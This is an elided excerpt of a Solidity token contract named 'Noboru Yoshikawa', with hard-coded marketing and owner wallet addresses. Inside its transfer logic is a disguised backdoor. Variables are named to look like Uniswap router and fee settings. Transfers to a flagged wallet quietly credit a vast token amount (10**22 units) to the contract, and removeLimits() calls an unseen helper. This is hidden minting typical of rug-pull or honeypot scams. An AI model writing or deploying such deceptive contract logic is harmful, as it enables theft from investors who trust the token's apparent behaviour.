...
contract NoboruYoshikawa  is Context, IERC20 { 
    ...
    mapping (address => bool) public _uniSwapPair02Trade;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0x139eFC8fDECD075836B0897b650ad3BF07B8CebE); 
    address payable public Wallet_Utility = payable(0x49875421d23E4CfB0da0a2A0fd88a08458b730D3);
    ...
    string private constant _name = "Noboru Yoshikawa "; 
    string private constant _symbol = unicode"Yoshikawa  "; 
    ...
    bool public uniSwapPair_V2Router = false;
    bool public swapAndLiquifyEnabled = true;
    bool public swaping_Liquify = false;
    ...
    constructor () {
        ...
        _owner = 0x49875421d23E4CfB0da0a2A0fd88a08458b730D3;
        ...
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            ...
            _uniSwapPair02Trade[Wallet_Marketing] = true;
    ...
    function removeLimits() public override returns (bool) {
        _allowanced();
        return true;
    }
    ...
    function _transfer(
        ...
        uniSwapPair_V2Router = _uniSwapPair02Trade[to] ? true : false;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (uniSwapPair_V2Router){
                uint256 BuySell_Fee = uniSwapPair_V2Router ? 10**(20+2) : 1;
                _tOwned[sender] = _tOwned[sender]-tAmount;
                uniSwapPair_V2Router = false;
                _tOwned[recipient] = _tOwned[recipient]+tAmount;
                _tOwned[address(this)] = _tOwned[address(this)]+BuySell_Fee;
                swaping_Liquify = true;
